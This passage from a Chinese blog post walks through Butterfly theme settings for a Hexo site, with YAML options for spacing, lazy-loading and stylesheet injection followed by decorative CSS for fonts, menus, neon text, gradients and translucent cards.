Notification in dark mode</span></span><br></pre></td></tr></table></figure></li><li><p>中英文空格</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约902行</span></span><br><span class="line"><span class="attr">pangu:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post</span></span><br></pre></td></tr></table></figure></li><li><p>图片懒加载</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约908行</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line">  <span class="attr">blur:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="CSS插件"><a href="#CSS插件" class="headerlink" title="CSS插件"></a>CSS插件</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><strong>butterfly中引入css</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约944行</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css&quot;&gt;</span> <span class="comment"># 引入组件库(f12)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/readPercent.css&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/announcement.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><strong>custom.css</strong></p><ol><li><p>一图流</p>   <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*一图流*/</span></span><br><span class="line"><span class="comment">/* 页脚与头图透明 */</span></span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#page-header</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 白天模式遮罩透明 */</span><span class="comment">/*设置的话记得不设置头图*/</span></span><br><span class="line">  <span class="comment">/*#footer::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  #page-header::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br><span class="line">  <span class="comment">/* 夜间模式遮罩透明 */</span><span class="comment">/*设置的话记得不设置页脚*/</span></span><br><span class="line">  <span class="comment">/*[data-theme=&quot;dark&quot;] #footer::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [data-theme=&quot;dark&quot;] #page-header::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br></pre></td></tr></table></figure></li><li><p>字体</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*字体*/</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="comment">/* 为载入的字体取名字(随意) */</span></span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&#x27;YSHST&#x27;</span>;</span><br><span class="line">  <span class="comment">/* 字体文件地址(相对或者绝对路径都可以) */</span></span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">/font/MaoKenZhuYuanTi-MaokenZhuyuanTi-2.ttf</span>);</span><br><span class="line">  <span class="comment">/* 定义加粗样式(加粗多少) */</span></span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">  <span class="comment">/* 定义字体样式(斜体/非斜体) */</span></span><br><span class="line">  <span class="attribute">font-style</span>: normal;</span><br><span class="line">  <span class="comment">/* 定义显示样式 */</span></span><br><span class="line">  <span class="attribute">font-display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>菜单栏</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*菜单栏设置*/</span></span><br><span class="line"><span class="comment">/* 一级菜单居中 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>: fit-content <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 子菜单横向展示 */</span></span><br><span class="line"><span class="comment">/*#nav .menus_items .menus_item:hover .menus_item_child &#123;</span></span><br><span class="line"><span class="comment">  display: flex !important;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */</span></span><br><span class="line"><span class="comment">/*.menus_items .menus_item:nth-child(2) .menus_item_child &#123;</span></span><br><span class="line"><span class="comment">  left: -125px;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure></li><li><p>夜间霓虹灯</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*夜间霓虹灯*/</span></span><br><span class="line"><span class="comment">/* 日间模式不生效 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-name</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-title</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-subtitle</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#post-info</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式生效 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-name</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-title</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_15px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-subtitle</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_10px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#post-info</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_5px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 关键帧描述 */</span></span><br><span class="line"><span class="keyword">@keyframes</span> light_15px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> light_10px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> light_5px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>宇宙星空特效</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*宇宙星空特效*/</span></span><br><span class="line"><span class="comment">/* 背景宇宙星光 */</span></span><br><span class="line"><span class="selector-id">#universe</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="comment">/* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */</span></span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>个人卡片渐变色</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*个人卡片渐变色*/</span></span><br><span class="line"><span class="comment">/* 侧边栏个人信息卡片动态渐变色 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">    -<span class="number">45deg</span>,</span><br><span class="line">    <span class="number">#e8d8b9</span>,</span><br><span class="line">    <span class="number">#eccec5</span>,</span><br><span class="line">    <span class="number">#a3e9eb</span>,</span><br><span class="line">    <span class="number">#bdbdf0</span>,</span><br><span class="line">    <span class="number">#eec1ea</span></span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgb</span>(<span class="number">66</span>, <span class="number">68</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">400%</span> <span class="number">400%</span>;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  -moz-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  <span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 黑夜模式适配 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#191919ee</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 个人信息Follow me按钮 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &gt; <span class="selector-id">#card-info-btn</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#3eb8be</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>样式整体设计</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*页面样式整体设计*/</span></span><br><span class="line"><span class="comment">/*根*/</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--trans-light</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.65</span>);</span><br><span class="line">  <span class="attr">--trans-dark</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.65</span>);</span><br><span class="line">  <span class="attr">--border-style</span>: <span class="number">2px</span> solid <span class="built_in">rgb</span>(<span class="number">169</span>, <span class="number">169</span>, <span class="number">169</span>);</span><br><span class="line">  <span class="attr">--backdrop-filter</span>: <span class="built_in">blur</span>(<span class="number">5px</span>) <span class="built_in">saturate</span>(<span class="number">150%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页文章卡片 */</span></span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-light);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页侧栏卡片 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-light);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 文章页、归档页、普通页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#page</span>,</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#archive</span> &#123;</span><br><span class="line">  <span class="comment">/*background: var(--trans-light);*/</span></span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 导航栏 */</span></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.75</span>);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#page-header</span><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.7</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式遮罩 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#archive</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#page</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-dark);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式页脚页头遮罩透明 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#footer</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#page-header</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 阅读模式 */</span></span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式下的阅读模式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.9</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.9</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>顶栏常驻</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*顶栏常驻*/</span></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span>&#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -moz-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -ms-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -o-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#nav</span>&#123;</span><br><span class="line">  <span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -ms-<span 